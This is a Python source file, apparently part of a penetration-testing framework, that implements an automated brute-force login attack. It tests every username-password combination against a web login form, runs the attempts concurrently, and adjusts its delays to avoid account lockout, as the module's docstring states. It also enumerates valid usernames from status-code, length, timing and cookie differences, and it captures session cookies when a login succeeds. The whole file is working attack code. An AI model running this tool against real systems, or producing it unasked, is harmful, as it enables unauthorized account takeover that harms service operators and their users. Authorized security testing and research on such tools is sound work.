"""Brute-force login module for automated credential testing

This module implements:
- Username-password combination testing
- Intelligent timing delays to avoid account lockout
- Success detection via regex or content length
- Username enumeration from response differences
- Automatic session capture on successful login
"""

import asyncio
import re
import statistics
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Set

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.session_manager import SessionManager, Session
from src.vulnchain.core.payload_engine import PayloadEngine


class LoginMethod(Enum):
    """HTTP methods for login"""
    
    GET = "GET"
    POST = "POST"


class SuccessDetectionMethod(Enum):
    """Methods for detecting successful login"""
    
    REGEX = "regex"
    CONTENT_LENGTH = "content_length"
    STATUS_CODE = "status_code"
    REDIRECT = "redirect"
    COOKIE = "cookie"


@dataclass
class LoginConfig:
    """Configuration for brute-force login attack"""
    
    url: str
    method: LoginMethod = LoginMethod.POST
    username_param: str = "username"
    password_param: str = "password"
    headers: Dict[str, str] = field(default_factory=dict)
    additional_data: Dict[str, str] = field(default_factory=dict)
    
    # Success detection
    success_detection: SuccessDetectionMethod = SuccessDetectionMethod.REGEX
    success_regex: Optional[str] = None
    failure_regex: Optional[str] = None
    success_status_codes: List[int] = field(default_factory=lambda: [200, 302])
    
    # Timing configuration
    delay_between_attempts: float = 0.5
    adaptive_delay: bool = True
    max_delay: float = 5.0
    
    # Rate limiting
    max_concurrent: int = 5
    requests_per_second: Optional[float] = None


@dataclass
class BruteForceResult:
    """Result of a single brute-force attempt"""
    
    username: str
    password: str
    success: bool
    response_time: float
    status_code: int
    content_length: int
    response_text: str
    session: Optional[Session] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class UsernameEnumerationResult:
    """Result of username enumeration"""
    
    username: str
    exists: bool
    confidence: float
    response_time: float
    content_length: int
    evidence: List[str] = field(default_factory=list)


@dataclass
class ResponseProfile:
    """Profile of response characteristics for comparison"""
    
    status_code: int
    content_length: int
    response_time: float
    has_redirect: bool
    redirect_location: Optional[str] = None
    cookies_set: Set[str] = field(default_factory=set)
    response_hash: Optional[str] = None


class BruteForceTester:
    """Brute-force login testing with intelligent timing"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        session_manager: SessionManager,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize brute-force tester
        
        Args:
            request_handler: Request handler for HTTP communication
            session_manager: Session manager for capturing authenticated sessions
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.session_manager = session_manager
        self.payload_engine = payload_engine or PayloadEngine()
        
        # Statistics for adaptive timing
        self._response_times: List[float] = []
        self._failed_attempts = 0
        self._current_delay = 0.5
    
    async def brute_force_login(
        self,
        config: LoginConfig,
        usernames: List[str],
        passwords: List[str],
    ) -> List[BruteForceResult]:
        """
        Perform brute-force attack on login form.
        
        Args:
            config: Login configuration
            usernames: List of usernames to test
            passwords: List of passwords to test
        
        Returns:
            List of brute-force results (successful attempts)
        """
        results = []
        total_attempts = len(usernames) * len(passwords)
        attempt_count = 0
        
        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(config.max_concurrent)
        
        # Rate limiting setup
        if config.requests_per_second:
            min_delay = 1.0 / config.requests_per_second
        else:
            min_delay = config.delay_between_attempts
        
        # Test all username-password combinations
        tasks = []
        for username in usernames:
            for password in passwords:
                task = self._test_credentials_with_semaphore(
                    config, username, password, semaphore, min_delay
                )
                tasks.append(task)
        
        # Execute all tasks and collect results
        for coro in asyncio.as_completed(tasks):
            result = await coro
            attempt_count += 1
            
            if result.success:
                results.append(result)
                print(f"[+] Success! Username: {result.username}, Password: {result.password}")
            
            # Adaptive delay adjustment
            if config.adaptive_delay:
                await self._adjust_delay(config, result)
        
        return results
    
    async def _test_credentials_with_semaphore(
        self,
        config: LoginConfig,
        username: str,
        password: str,
        semaphore: asyncio.Semaphore,
        min_delay: float,
    ) -> BruteForceResult:
        """Test credentials with semaphore for concurrency control"""
        async with semaphore:
            result = await self._test_credentials(config, username, password)
            
            # Apply delay
            await asyncio.sleep(min_delay)
            
            return result
    
    async def _test_credentials(
        self,
        config: LoginConfig,
        username: str,
        password: str,
    ) -> BruteForceResult:
        """
        Test a single username-password combination.
        
        Args:
            config: Login configuration
            username: Username to test
            password: Password to test
        
        Returns:
            BruteForceResult with test outcome
        """
        # Prepare request data
        data = config.additional_data.copy()
        data[config.username_param] = username
        data[config.password_param] = password
        
        # Send login request
        start_time = time.time()
        
        if config.method == LoginMethod.POST:
            response = await self.request_handler.send_request(
                method="POST",
                url=config.url,
                headers=config.headers,
                data=data,
            )
        else:  # GET
            # For GET, add credentials to URL parameters
            from urllib.parse import urlencode, urlparse, urlunparse
            
            parsed = urlparse(config.url)
            query = urlencode(data)
            url_with_params = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                query,
                parsed.fragment,
            ))
            
            response = await self.request_handler.send_request(
                method="GET",
                url=url_with_params,
                headers=config.headers,
            )
        
        elapsed_time = time.time() - start_time
        
        # Track response time for adaptive delay
        self._response_times.append(elapsed_time)
        if len(self._response_times) > 100:
            self._response_times.pop(0)
        
        # Determine if login was successful
        success = self._detect_success(config, response)
        
        # Capture session if successful
        session = None
        if success:
            session = self.session_manager.capture_session(response)
        else:
            self._failed_attempts += 1
        
        # Build result
        result = BruteForceResult(
            username=username,
            password=password,
            success=success,
            response_time=elapsed_time,
            status_code=response.status_code,
            content_length=len(response.text),
            response_text=response.text[:1000],  # First 1000 chars
            session=session,
            metadata={
                "method": config.method.value,
                "url": config.url,
            },
        )
        
        # Add evidence
        if success:
            result.evidence.append(f"Successful login detected")
            result.evidence.append(f"Username: {username}")
            result.evidence.append(f"Password: {password}")
            result.evidence.append(f"Status code: {response.status_code}")
            result.evidence.append(f"Response time: {elapsed_time:.2f}s")
            
            if session:
                result.evidence.append(f"Session captured: {session.session_id}")
                result.evidence.append(f"Cookies: {list(session.cookies.keys())}")
        
        return result
    
    def _detect_success(self, config: LoginConfig, response: Response) -> bool:
        """
        Detect if login was successful based on configuration.
        
        Args:
            config: Login configuration
            response: HTTP response
        
        Returns:
            True if login successful, False otherwise
        """
        if config.success_detection == SuccessDetectionMethod.REGEX:
            # Check for success regex
            if config.success_regex:
                if re.search(config.success_regex, response.text, re.IGNORECASE):
                    return True
            
            # Check for failure regex (inverse)
            if config.failure_regex:
                if not re.search(config.failure_regex, response.text, re.IGNORECASE):
                    return True
            
            return False
        
        elif config.success_detection == SuccessDetectionMethod.STATUS_CODE:
            return response.status_code in config.success_status_codes
        
        elif config.success_detection == SuccessDetectionMethod.REDIRECT:
            # Check if response is a redirect
            return response.status_code in [301, 302, 303, 307, 308]
        
        elif config.success_detection == SuccessDetectionMethod.COOKIE:
            # Check if any cookies were set
            set_cookie_headers = response.headers.get("Set-Cookie", "")
            return bool(set_cookie_headers)
        
        elif config.success_detection == SuccessDetectionMethod.CONTENT_LENGTH:
            # This requires baseline - not implemented in simple detection
            # Would need to compare against known failure response length
            return False
        
        return False
    
    async def _adjust_delay(self, config: LoginConfig, result: BruteForceResult):
        """
        Adjust delay based on response patterns (adaptive timing).
        
        Args:
            config: Login configuration
            result: Latest brute-force result
        """
        if not config.adaptive_delay:
            return
        
        # If we're getting slow responses, increase delay
        if len(self._response_times) >= 10:
            recent_avg = statistics.mean(self._response_times[-10:])
            overall_avg = statistics.mean(self._response_times)
            
            # If recent responses are significantly slower, increase delay
            if recent_avg > overall_avg * 1.5:
                self._current_delay = min(
                    self._current_delay * 1.2,
                    config.max_delay
                )
                await asyncio.sleep(self._current_delay)
        
        # If we've had many failures in a row, increase delay
        if self._failed_attempts > 0 and self._failed_attempts % 20 == 0:
            self._current_delay = min(
                self._current_delay * 1.5,
                config.max_delay
            )
            await asyncio.sleep(self._current_delay)
    
    async def enumerate_usernames(
        self,
        config: LoginConfig,
        usernames: List[str],
        invalid_password: str = "ThisPasswordIsDefinitelyWrong123!@#",
    ) -> List[UsernameEnumerationResult]:
        """
        Enumerate valid usernames based on response differences.
        
        Args:
            config: Login configuration
            usernames: List of usernames to test
            invalid_password: Password known to be invalid
        
        Returns:
            List of username enumeration results
        """
        results = []
        
        # First, establish baseline with known invalid username
        baseline_profile = await self._get_response_profile(
            config,
            "ThisUsernameDoesNotExist_" + str(time.time()),
            invalid_password,
        )
        
        # Test each username
        for username in usernames:
            profile = await self._get_response_profile(
                config, username, invalid_password
            )
            
            # Compare with baseline
            exists, confidence, evidence = self._compare_profiles(
                baseline_profile, profile, username
            )
            
            result = UsernameEnumerationResult(
                username=username,
                exists=exists,
                confidence=confidence,
                response_time=profile.response_time,
                content_length=profile.content_length,
                evidence=evidence,
            )
            
            results.append(result)
            
            # Small delay between attempts
            await asyncio.sleep(config.delay_between_attempts)
        
        return results
    
    async def _get_response_profile(
        self,
        config: LoginConfig,
        username: str,
        password: str,
    ) -> ResponseProfile:
        """
        Get response profile for username-password combination.
        
        Args:
            config: Login configuration
            username: Username to test
            password: Password to test
        
        Returns:
            ResponseProfile with response characteristics
        """
        # Prepare request data
        data = config.additional_data.copy()
        data[config.username_param] = username
        data[config.password_param] = password
        
        # Send request
        start_time = time.time()
        
        if config.method == LoginMethod.POST:
            response = await self.request_handler.send_request(
                method="POST",
                url=config.url,
                headers=config.headers,
                data=data,
            )
        else:
            from urllib.parse import urlencode, urlparse, urlunparse
            
            parsed = urlparse(config.url)
            query = urlencode(data)
            url_with_params = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                query,
                parsed.fragment,
            ))
            
            response = await self.request_handler.send_request(
                method="GET",
                url=url_with_params,
                headers=config.headers,
            )
        
        elapsed_time = time.time() - start_time
        
        # Extract profile information
        has_redirect = response.status_code in [301, 302, 303, 307, 308]
        redirect_location = response.headers.get("Location") if has_redirect else None
        
        # Extract cookies
        cookies_set = set()
        set_cookie = response.headers.get("Set-Cookie", "")
        if set_cookie:
            # Simple cookie name extraction
            for cookie_str in set_cookie.split(","):
                if "=" in cookie_str:
                    cookie_name = cookie_str.split("=")[0].strip()
                    cookies_set.add(cookie_name)
        
        # Create hash of response content for comparison
        import hashlib
        response_hash = hashlib.md5(response.text.encode()).hexdigest()
        
        return ResponseProfile(
            status_code=response.status_code,
            content_length=len(response.text),
            response_time=elapsed_time,
            has_redirect=has_redirect,
            redirect_location=redirect_location,
            cookies_set=cookies_set,
            response_hash=response_hash,
        )
    
    def _compare_profiles(
        self,
        baseline: ResponseProfile,
        test: ResponseProfile,
        username: str,
    ) -> Tuple[bool, float, List[str]]:
        """
        Compare response profiles to determine if username exists.
        
        Args:
            baseline: Baseline profile (invalid username)
            test: Test profile (username to check)
            username: Username being tested
        
        Returns:
            Tuple of (exists, confidence, evidence)
        """
        evidence = []
        confidence = 0.0
        indicators = 0
        total_checks = 0
        
        # Check status code difference
        total_checks += 1
        if baseline.status_code != test.status_code:
            indicators += 1
            evidence.append(
                f"Status code differs: baseline={baseline.status_code}, "
                f"test={test.status_code}"
            )
        
        # Check content length difference (significant difference)
        total_checks += 1
        length_diff = abs(baseline.content_length - test.content_length)
        if length_diff > 50:  # More than 50 bytes difference
            indicators += 1
            evidence.append(
                f"Content length differs significantly: "
                f"baseline={baseline.content_length}, test={test.content_length}, "
                f"diff={length_diff}"
            )
        
        # Check response time difference (timing attack)
        total_checks += 1
        time_diff = abs(baseline.response_time - test.response_time)
        if time_diff > 0.5:  # More than 500ms difference
            indicators += 1
            evidence.append(
                f"Response time differs: baseline={baseline.response_time:.2f}s, "
                f"test={test.response_time:.2f}s, diff={time_diff:.2f}s"
            )
        
        # Check redirect behavior
        total_checks += 1
        if baseline.has_redirect != test.has_redirect:
            indicators += 1
            evidence.append(
                f"Redirect behavior differs: baseline={baseline.has_redirect}, "
                f"test={test.has_redirect}"
            )
        
        # Check cookies set
        total_checks += 1
        if baseline.cookies_set != test.cookies_set:
            indicators += 1
            evidence.append(
                f"Cookies differ: baseline={baseline.cookies_set}, "
                f"test={test.cookies_set}"
            )
        
        # Check response hash (content difference)
        total_checks += 1
        if baseline.response_hash != test.response_hash:
            indicators += 1
            evidence.append(
                f"Response content differs (hash mismatch)"
            )
        
        # Calculate confidence
        confidence = indicators / total_checks
        exists = confidence >= 0.3  # At least 30% of indicators suggest difference
        
        if exists:
            evidence.insert(0, f"Username '{username}' likely exists (confidence: {confidence:.2%})")
        else:
            evidence.insert(0, f"Username '{username}' likely does not exist (confidence: {1-confidence:.2%})")
        
        return exists, confidence, evidence


class BruteForceAttack:
    """High-level interface for brute-force attacks"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        session_manager: SessionManager,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize brute-force attack
        
        Args:
            request_handler: Request handler for HTTP communication
            session_manager: Session manager for capturing sessions
            payload_engine: Optional payload engine for wordlists
        """
        self.tester = BruteForceTester(
            request_handler, session_manager, payload_engine
        )
    
    async def attack(
        self,
        config: LoginConfig,
        usernames: List[str],
        passwords: List[str],
        enumerate_first: bool = True,
    ) -> Dict:
        """
        Perform complete brute-force attack.
        
        Args:
            config: Login configuration
            usernames: List of usernames to test
            passwords: List of passwords to test
            enumerate_first: Whether to enumerate usernames first
        
        Returns:
            Dictionary with attack results
        """
        results = {
            "successful_logins": [],
            "enumerated_usernames": [],
            "total_attempts": 0,
            "successful_attempts": 0,
        }
        
        # Step 1: Username enumeration (optional)
        valid_usernames = usernames
        if enumerate_first and len(usernames) > 1:
            print("[*] Enumerating usernames...")
            enum_results = await self.tester.enumerate_usernames(config, usernames)
            
            # Filter to likely valid usernames
            valid_usernames = [
                r.username for r in enum_results
                if r.exists and r.confidence >= 0.3
            ]
            
            results["enumerated_usernames"] = [
                {
                    "username": r.username,
                    "exists": r.exists,
                    "confidence": r.confidence,
                    "evidence": r.evidence,
                }
                for r in enum_results
            ]
            
            if valid_usernames:
                print(f"[+] Found {len(valid_usernames)} likely valid usernames")
            else:
                print("[!] No valid usernames found, using all provided usernames")
                valid_usernames = usernames
        
        # Step 2: Brute-force attack
        print(f"[*] Starting brute-force attack...")
        print(f"[*] Testing {len(valid_usernames)} usernames with {len(passwords)} passwords")
        
        brute_results = await self.tester.brute_force_login(
            config, valid_usernames, passwords
        )
        
        results["total_attempts"] = len(valid_usernames) * len(passwords)
        results["successful_attempts"] = len(brute_results)
        
        # Format successful logins
        for result in brute_results:
            results["successful_logins"].append({
                "username": result.username,
                "password": result.password,
                "session_id": result.session.session_id if result.session else None,
                "response_time": result.response_time,
                "status_code": result.status_code,
                "evidence": result.evidence,
            })
        
        return results
